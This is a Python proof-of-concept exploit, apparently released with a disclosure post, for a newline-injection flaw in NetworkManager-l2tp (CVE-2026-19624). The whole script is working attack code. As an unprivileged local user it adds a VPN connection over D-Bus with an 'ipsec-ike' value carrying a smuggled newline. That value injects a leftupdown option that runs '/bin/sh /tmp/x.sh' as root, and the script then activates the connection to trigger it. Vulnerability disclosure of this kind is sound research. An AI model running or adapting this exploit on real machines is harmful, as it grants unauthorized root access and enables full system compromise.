#!/usr/bin/env python3
#
# LinnemanLabs - nm-l2tp PoC - root exec from newline injection
# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root
#
# CVE-2026-19624
#
# Runs as unprivileged local user. Creates L2TP vpn connection with newline and additional config
# options in vpn.data["ipsec-ike"]. NM(root) -> nm-l2tp-service(root) writes them into
# /run/nm-l2tp-<uuid>/ipsec.conf and loads them as root via `ipsec add`/`ipsec up`.
#
# Env vars:
#   POC_GATEWAY, POC_PSK, POC_IKEV2, POC_RPORT, POC_ESP, POC_LEFTUPDOWN
#
import dbus, uuid, os, getpass, time

NM    = "org.freedesktop.NetworkManager"
# default to our minimal ike responder that listens on 127.0.0.2
GW    = os.environ.get("POC_GATEWAY", "127.0.0.2")
# 0s<base64 of password> - default: "linnemanlabs-poc"
PSK   = os.environ.get("POC_PSK", "0sbGlubmVtYW5sYWJzLXBvYw==")
# IKEv2 loads on libreswan 5.3
IKEV2 = os.environ.get("POC_IKEV2", "yes")
# default to our minimal ike responder that listens on 5500 (unprivileged)
RPORT = os.environ.get("POC_RPORT", "5500")
ESP   = os.environ.get("POC_ESP", "")
LUD   = os.environ.get("POC_LEFTUPDOWN", "\"/bin/sh /tmp/x.sh\"")

# valid proposal for our responder PoC
INJECT = f"aes128-sha256-modp2048\n  leftupdown={LUD}\n  rightikeport={RPORT}"
rightikeport=5500
bus = dbus.SystemBus()
settings = dbus.Interface(bus.get_object(NM, "/org/freedesktop/NetworkManager/Settings"), NM + ".Settings")
mgr = dbus.Interface(bus.get_object(NM, "/org/freedesktop/NetworkManager"), NM)

u = str(uuid.uuid4())
data = {"gateway": GW, "user": "k", "password-flags": "0",
        "ipsec-enabled": "yes", "ipsec-ikev2": IKEV2, "ipsec-ike": INJECT}
if ESP:
    data["ipsec-esp"] = ESP

con = dbus.Dictionary({
    "connection": dbus.Dictionary({
        "id": "linnemanlabs-poc", "uuid": u, "type": "vpn",
        "permissions": dbus.Array(["user:%s:" % getpass.getuser()], signature="s"),
    }, signature="sv"),
    "vpn": dbus.Dictionary({
        "service-type": "org.freedesktop.NetworkManager.l2tp",
        "data": dbus.Dictionary(data, signature="ss"),
        "secrets": dbus.Dictionary({"password": "k", "ipsec-psk": PSK}, signature="ss"),
    }, signature="sv"),
    "ipv4": dbus.Dictionary({"method": "auto"}, signature="sv"),
    "ipv6": dbus.Dictionary({"method": "auto"}, signature="sv"),
}, signature="sa{sv}")

path = settings.AddConnection(con)
print(f"[+] l2tp connection added: path={path} uuid={u}")
time.sleep(2)
try:
    ac = mgr.ActivateConnection(path, "/", "/")
    print(f"[+] connection activated: path={ac}")
except Exception as e:
    print(f"[-] error activating connection: {e}")
